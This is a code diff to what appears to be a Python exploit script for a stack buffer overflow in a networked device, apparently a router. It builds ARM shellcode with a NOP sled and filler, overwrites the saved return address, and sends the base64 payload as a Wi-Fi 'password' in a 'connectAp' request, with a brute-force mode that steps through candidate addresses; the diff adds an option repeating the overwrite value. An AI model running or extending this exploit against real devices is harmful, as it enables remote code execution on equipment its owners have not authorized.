@@ -37,15 +37,12 @@ def build_shellcode():
 SLED = b"\x00\x00\xa0\xe1" * 256   # mov r0,r0
 
 
-def build(offset, marker=None, addr=None, sled=0):
+def build(offset, marker=None, addr=None, sled=0, padpc=1):
     """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode."""
     sc = build_shellcode()
     filler = bytes(random.getrandbits(8) for _ in range(offset))
-    pc = b""
-    if marker is not None:
-        pc = marker.to_bytes(4, "little")
-    if addr is not None:
-        pc = addr.to_bytes(4, "little")
+    val = marker if marker is not None else addr
+    pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
     return base64.b64encode(filler + pc + SLED[:sled] + sc).decode()
 
 
@@ -115,6 +112,7 @@ def main():
     ap.add_argument("--out", default=None)
     ap.add_argument("--addr", type=lambda x: int(x, 0), default=None)
     ap.add_argument("--sled", type=int, default=0)
+    ap.add_argument("--padpc", type=int, default=1)
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
     a = ap.parse_args()
@@ -126,7 +124,7 @@ def main():
         sess = login(a.host)
         for i in range(a.count if a.mode == "brute" else 1):
             candidate = base + i * a.step
-            b64 = build(a.offset, addr=candidate, sled=a.sled)
+            b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc)
             params = {"ssid": "Aardvark", "password": b64, "encrypt_type": "3"}
             t0 = time.time()
             r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
@@ -142,7 +140,7 @@ def main():
                 sess = login(a.host, tries=40)
         return
 
-    b64 = build(a.offset, a.marker, a.addr, a.sled)
+    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc)
     if a.mode == "build":
         if a.out:
             open(a.out, "w").write(b64)
